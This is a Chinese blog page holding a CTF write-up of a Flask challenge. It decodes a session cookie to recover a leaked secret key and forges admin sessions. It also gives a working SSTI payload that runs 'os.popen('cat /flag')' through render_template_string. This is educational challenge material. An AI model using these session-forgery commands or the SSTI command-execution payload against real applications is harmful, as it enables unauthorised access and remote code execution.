@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/image/favicons/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/image/favicons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/image/favicons/favicon-16x16.png">
+  <link rel="mask-icon" href="/image/favicons/favicon.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"paoka1.top","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"default"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="记一道 Flask 题目（SSTI 和 Session 伪造）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一道 Flask 题目">
+<meta property="og:url" content="https://paoka1.top/2022/05/29/%E8%AE%B0%E4%B8%80%E9%81%93-Flask-%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="Paoka1&#39;s Blog">
+<meta property="og:description" content="记一道 Flask 题目（SSTI 和 Session 伪造）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/04/catcat.jpg">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/05/DirSearch.png">
+<meta property="og:image" content="https://paoka1.top/image/post/2022/05/Session_Success.png">
+<meta property="article:published_time" content="2022-05-29T14:56:06.000Z">
+<meta property="article:modified_time" content="2026-01-04T12:34:55.209Z">
+<meta property="article:author" content="Paoka1">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Flask">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="Session">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://paoka1.top/image/post/2022/04/catcat.jpg">
+
+
+<link rel="canonical" href="https://paoka1.top/2022/05/29/%E8%AE%B0%E4%B8%80%E9%81%93-Flask-%E9%A2%98%E7%9B%AE/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://paoka1.top/2022/05/29/%E8%AE%B0%E4%B8%80%E9%81%93-Flask-%E9%A2%98%E7%9B%AE/","path":"2022/05/29/记一道-Flask-题目/","title":"记一道 Flask 题目"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>记一道 Flask 题目 | Paoka1's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Paoka1's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to my blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="nav-number">1.</span> <span class="nav-text">题目来源</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E5%AF%9F%E5%86%85%E5%AE%B9"><span class="nav-number">2.</span> <span class="nav-text">考察内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">解题部分</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96-Session"><span class="nav-number">3.1.</span> <span class="nav-text">读取 Session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81"><span class="nav-number">3.2.</span> <span class="nav-text">读取源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0-Session"><span class="nav-number">3.3.</span> <span class="nav-text">伪造 Session</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Paoka1"
+      src="/image/favicons/favicon.ico">
+  <p class="site-author-name" itemprop="name">Paoka1</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/paoka1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;paoka1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shauio@163.com" title="E-Mail → mailto:shauio@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://paoka1.top/2022/05/29/%E8%AE%B0%E4%B8%80%E9%81%93-Flask-%E9%A2%98%E7%9B%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/image/favicons/favicon.ico">
+      <meta itemprop="name" content="Paoka1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="记一道 Flask 题目 | Paoka1's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一道 Flask 题目
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-05-29 22:56:06" itemprop="dateCreated datePublished" datetime="2022-05-29T22:56:06+08:00">2022-05-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-01-04 20:34:55" itemprop="dateModified" datetime="2026-01-04T20:34:55+08:00">2026-01-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>记一道 Flask 题目（SSTI 和 Session 伪造）</p>
+<center><img src="/image/post/2022/04/catcat.jpg"></center>
+
+<span id="more"></span>
+
+<h3 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h3><p><a target="_blank" rel="noopener" href="https://github.com/seizer-zyx/second-xupt-ctf/tree/main/flask">second-xupt-ctf flask</a></p>
+<h3 id="考察内容"><a href="#考察内容" class="headerlink" title="考察内容"></a>考察内容</h3><p>Flask 的模板注入和 Session 伪造</p>
+<h3 id="解题部分"><a href="#解题部分" class="headerlink" title="解题部分"></a>解题部分</h3><h4 id="读取-Session"><a href="#读取-Session" class="headerlink" title="读取 Session"></a>读取 Session</h4><p>打开题目，根据提示向<code>name</code>进行 POST 传参，随便传一个<code>name=123</code>，页面变成了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>第一感觉就是 SSTI，但尝试<code>name=&#123;&#123;2*2&#125;&#125;</code>，<code>name=&#123;&#123;7+7&#125;&#125;</code>，都没有发现什么，转眼来看看 Session，一看果然有：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyb2xlIjp7ImlzX2FkbWluIjowLCJuYW1lIjoidGVzdCIsInNlY3JldF9rZXkiOiJWR2d4YzBCdmJtVWhjMlZEY21WMElRPT0ifX0.YpN2Ew<span class="number">.4</span>qiPyZ2fTZ0rtn5PSaClWajo5IA</span><br></pre></td></tr></table></figure>
+
+<p>一下就想到 Session 的伪造，拿脚本直接解密试试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
+
+<p>直接能得到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;role&#x27;</span>: &#123;<span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;secret_key&#x27;</span>: <span class="string">&#x27;VGgxc0BvbmUhc2VDcmV0IQ==&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这直接把<code>secret_key</code>给放出来了？显然是 Base64，拿来去解码，得到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Th1s@one!seCret!</span><br></pre></td></tr></table></figure>
+
+<p>但光拿到<code>secret_key</code>也不够啊，看看能不能找到其他可以利用的点，最后在根目录的响应中发现了<code>hint: Part of the source in /source</code>（也可以通过 <code>dirsearch</code> 扫描得知，如下）</p>
+<p><img src="/image/post/2022/05/DirSearch.png" alt="使用 dirsearch 扫描的结果"></p>
+<h4 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h4><p>访问<code>/source</code>得到（格式化了，并去掉了一部分）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&#x27;source&#x27;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        role = session.get(<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(role, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;~~~~~~hacker!&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> role.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        flag = role.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        flag = <span class="built_in">filter</span>(flag)</span><br><span class="line">        message = <span class="string">&quot;%s, I hope you have a good time!your flag is &quot;</span> % flag</span><br><span class="line">        <span class="keyword">return</span> render_template_string(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I don&#x27;t know you&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>简单分析源码发现，我们要进入<code>/admin</code>这个路由，然后伪造 Session 成为 admin，因为通过 19 和 20 代码发现这里存在 SSTI</p>
+<h4 id="伪造-Session"><a href="#伪造-Session" class="headerlink" title="伪造 Session"></a>伪造 Session</h4><p>直接使用 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py">脚本</a> 进行伪造（key 文件的内容是 secret_key，这样写是因为直接写会让 bash 会对<code>secret_key</code>产生歧义）：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python make.py encode -s <span class="string">&quot;`cat key`&quot;</span> -t <span class="string">&quot;&#123;&#x27;role&#x27;: &#123;&#x27;is_admin&#x27;: 1, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;secret_key&#x27;: &#x27;VGgxc0BvbmUhc2VDcmV0IQ==&#x27;, &#x27;flag&#x27;: &#x27;&#123;&#123;config&#125;&#125;&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到（每次生成的内容会有些不一样）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyb2xlIjp7ImZsYWciOiJ7e2NvbmZpZ319IiwiaXNfYWRtaW4iOjEsIm5hbWUiOiJ0ZXN0Iiwic2VjcmV0X2tleSI6IlZHZ3hjMEJ2Ym1VaGMyVkRjbVYwSVE9PSJ9fQ.YpN_Aw.M5za75JpmyKiqCSeK0RA8CaAK4A</span><br></pre></td></tr></table></figure>
+
+<p>覆盖原有的 Session，访问<code>admin</code>，看到：</p>
+<p><img src="/image/post/2022/05/Session_Success.png" alt="成功 SSTI"></p>
+<p>说明 SSTI 成功了（这里也可以用<code>&#123;&#123;7*7&#125;&#125;</code>来验证），现在来构造 Payload 来读取 Flag（省去了<code>secret_key</code>）：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python make.py encode -s <span class="string">&quot;`cat key`&quot;</span> -t <span class="string">&#x27;&#123;&quot;role&quot;: &#123;&quot;is_admin&quot;: 1, &quot;name&quot;: &quot;test&quot;, &quot;flag&quot;: &quot;&#123;&#123;config.__class__.__init__.__globals__.os.popen(\x27cat /flag\x27).read()&#125;&#125;&quot;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdjcEKhDAMBX9leRcVpMte-zMhW2sJ1ERMb6X_vrq3YWCYjstqRuzYKxdE9J5MdymBKFV2J7pJVNofSrUv10eah9POrPOUuL3eTz0t4cq8zcsYWCFOvB2iiJ8Vysc9QcveMMYPexcoOA.YpTOeQ.QaV7YYeoxlIVXet2n1_D3vA8UTc</span><br></pre></td></tr></table></figure>
+
+<p>在这里题目作者说：</p>
+<blockquote>
+<p>在构造<code>payload</code>时需要注意的是不能出现单引号，在伪造 Session 的过程中 <strong>单引号会丢失</strong>（这应该与它的加密原理有关），所以咱们可以用<code>十六进制 \0x27</code> 进行绕过。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Flask/" rel="tag"># Flask</a>
+              <a href="/tags/Session/" rel="tag"># Session</a>
+              <a href="/tags/SSTI/" rel="tag"># SSTI</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/05/28/Flask-%E7%9A%84-SESSION-%E4%BC%AA%E9%80%A0/" rel="prev" title="Flask 的 SESSION 伪造">
+                  <i class="fa fa-angle-left"></i> Flask 的 SESSION 伪造
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/06/22/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/" rel="next" title="Python 多线程基础用法">
+                  Python 多线程基础用法 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备2022001516号 </a>
+  </div>
+  <div class="copyright">
+    &copy; 2022 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Paoka1</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
